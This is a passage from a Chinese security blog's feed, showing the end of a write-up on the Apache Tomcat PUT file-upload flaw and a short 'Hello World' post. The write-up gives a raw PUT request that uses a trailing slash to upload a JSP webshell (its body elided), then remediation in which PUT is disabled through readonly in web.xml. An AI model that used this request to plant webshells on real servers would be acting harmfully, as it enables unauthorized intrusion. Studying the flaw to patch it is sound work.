src="https://forum.90sec.com/uploads/default/original/1X/577172d6a7c0d29f66cfca32de1d4d94747dbb80.png"></p><p>看到可以命令执行(我们上传的payload是命令执行的脚本)，我们也可以上传一个jsp的webshell。。。。。</p><p>上传姿势二：</p><p>我们知道servlet在识别1.jsp/时会把它当作非jsp文件交给DefaultServlet 来处理，而后续保存文件的时候，文件名不接受/字符，故而忽略掉</p><p>payload：(这次我们演示上传一个webshell)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /webshell.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.26</span>.1.8:<span class="number">8080</span></span><br><span class="line">Content-Length: <span class="number">6239</span></span><br><span class="line"></span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"</span>%&gt;</span><br><span class="line">......</span><br><span class="line">jsp一句话太长..省略</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>我们还是利用burpsuite发送我们构造的payload：<br><img src="https://forum.90sec.com/uploads/default/original/1X/9768fbcc27515efcb0fcedaf39213e52ed1d65d3.png"><br>可以看到返回响应码201，说明我们上传成功了。我们访问我们jsp脚本试试：<br><img src="https://forum.90sec.com/uploads/default/original/1X/577172d6a7c0d29f66cfca32de1d4d94747dbb80.png"></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><p>1.升级到Apache Tomcat更高版本。</p><p>2.通过测试，注释掉readonly配置或配置readonly的值为true时PUT不生效。</p><p>用户可以禁用PUT方法来防护此漏洞，操作方式如下：</p><p>在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-漏洞背景&quot;&gt;&lt;a href=&quot;#0x00-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞背景&quot;&gt;&lt;/a&gt;0x00 漏洞背景&lt;/h2&gt;&lt;p&gt;Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器
      
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="getshell" scheme="https://j2ekim.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://j2ekim.github.io/2017/12/08/hello-world/"/>
    <id>https://j2ekim.github.io/2017/12/08/hello-world/</id>
    <published>2017-12-08T14:19:05.000Z</published>
    <updated>2018-04-02T14:11:55.362Z</updated>
    
    <content type="html"><![CDATA[<p>在echoingursb师傅<a href="http://www.jianshu.com/p/f9818d0795e2" target="_blank" rel="noopener">文章</a>的帮助下，这个博客终于搭建起来了。<br>博客使用<a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank" rel="noopener">indigo主题</a>。<br><a id="more"></a><br>折腾了好久，当github page上看到自己的博客加载出来的时候，真的很开心。<br>今后将用它来记录我成长(学习+生活)的道路，这也是博客的初衷。</p><p>引用dalao的一句话</p><blockquote><p>“能安静下来做事的人会成为大牛，能随时随地安静下来做事的人会成为大神。”</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在echoingursb师傅&lt;a href=&quot;http://www.jianshu.com/p/f9818d0795e2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;文章&lt;/a&gt;的帮助下，这个博客终于搭建起来了。&lt;br&gt;博客使用&lt;a href=&quot;https://github.com/yscoder/hexo-theme-indigo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;indigo主题&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="Hello Word" scheme="https://j2ekim.github.io/categories/Hello-Word/"/>
    
    
      <category term="Hello Word" scheme="https://j2ekim.github.io/tags/Hello-Word/"/>
    
      <category term="Wish" scheme="https://j2ekim.github.io/tags/Wish/"/>
    
  </entry>
  
</feed>
